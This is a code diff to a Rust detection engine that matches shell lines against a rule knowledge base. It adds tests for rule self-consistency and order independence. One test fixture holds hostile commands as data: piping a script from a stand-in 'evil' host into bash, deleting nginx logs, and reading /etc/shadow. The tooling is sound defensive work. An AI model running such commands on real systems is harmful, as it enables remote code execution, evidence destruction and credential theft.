@@ -3,7 +3,7 @@
 
 use std::collections::HashSet;
 
-use crate::kb;
+use crate::matcher::Matcher;
 use crate::model::{Finding, KnowledgeBase, Report, Severity};
 use crate::parser::{self, parse_line};
 
@@ -32,6 +32,9 @@ pub fn analyze(input: &str, kb: &KnowledgeBase) -> Report {
     let mut findings = Vec::new();
     let mut lines_analyzed = 0;
 
+    // Compile each entry's matcher once (lowering legacy fields as needed).
+    let matchers: Vec<Matcher> = kb.entries.iter().map(|e| e.compiled_matcher()).collect();
+
     for unit in parser::preprocess(input) {
         let trimmed = unit.text.trim();
         if trimmed.is_empty() || trimmed.starts_with('#') {
@@ -50,22 +53,14 @@ pub fn analyze(input: &str, kb: &KnowledgeBase) -> Report {
         // both a command and a raw match) is reported once.
         let mut seen: HashSet<&str> = HashSet::new();
 
-        for entry in &kb.entries {
-            // The specific command that matched (for command entries), else the
-            // line's first command (for raw/line matches). Kept so coverage
-            // analysis can evaluate rule logic against it.
-            let (matched, matched_command) = if entry.command.is_some() {
-                let cmd = commands
-                    .iter()
-                    .find(|cmd| kb::command_entry_matches(entry, cmd))
-                    .cloned();
-                (cmd.is_some(), cmd)
-            } else if kb::raw_entry_matches(entry, trimmed) {
-                (true, commands.first().cloned())
-            } else {
-                (false, None)
-            };
-            if matched && seen.insert(entry.id.as_str()) {
+        for (entry, matcher) in kb.entries.iter().zip(&matchers) {
+            // `evaluate` yields the specific command that matched (for
+            // command-scoped matchers) or the line's first command (for
+            // line-scoped matches), kept so coverage analysis can evaluate rule
+            // logic against it.
+            if let Some(matched_command) = matcher.evaluate(&commands, trimmed)
+                && seen.insert(entry.id.as_str())
+            {
                 findings.push(finding_from_entry(entry, unit.line, matched_command));
             }
         }
@@ -93,6 +88,7 @@ pub fn analyze(input: &str, kb: &KnowledgeBase) -> Report {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::kb;
 
     fn kb() -> KnowledgeBase {
         kb::load(kb::Platform::LinuxAuditd).expect("embedded KB must parse")
@@ -478,5 +474,57 @@ mod tests {
                 "expected a log-clearing finding for `{cmd}`"
             );
         }
+    }
+
+    // ---- Structured-matcher guards ------------------------------------------
+
+    /// Every entry's own representative command must fire its own rule. This is
+    /// the self-consistency property: a matcher whose example does not match
+    /// itself is a broken rule. It also proves the representative derivation used
+    /// by `--verify-detections` / `--scaffold` stays aligned with the engine.
+    fn assert_self_consistent(kb: &KnowledgeBase) {
+        for entry in &kb.entries {
+            let repr = entry
+                .compiled_matcher()
+                .representative_line()
+                .unwrap_or_else(|| {
+                    panic!(
+                        "entry `{}` has no matchable field to build a representative from",
+                        entry.id
+                    )
+                });
+            let report = analyze(&repr, kb);
+            assert!(
+                report.findings.iter().any(|f| f.rule_id == entry.id),
+                "entry `{}` did not fire on its own representative `{repr}`",
+                entry.id,
+            );
+        }
+    }
+
+    #[test]
+    fn every_entry_matches_its_own_representative() {
+        assert_self_consistent(&kb());
+        assert_self_consistent(&win_kb());
+        assert_self_consistent(&mac_kb());
+    }
+
+    /// Findings must not depend on the order entries appear in the KB: matching
+    /// is a per-entry predicate with no cross-entry precedence (unlike the EDR
+    /// classifier). Reversing the entry list must yield the same finding ids.
+    #[test]
+    fn entry_order_does_not_affect_findings() {
+        let script = "curl http://evil/x.sh | bash\nrm -rf /var/log/nginx\ncat /etc/shadow";
+        let base = kb();
+        let mut reversed = base.clone();
+        reversed.entries.reverse();
+
+        let ids = |report: &Report| -> std::collections::BTreeSet<String> {
+            report.findings.iter().map(|f| f.rule_id.clone()).collect()
+        };
+        assert_eq!(
+            ids(&analyze(script, &base)),
+            ids(&analyze(script, &reversed))
+        );
     }
 }
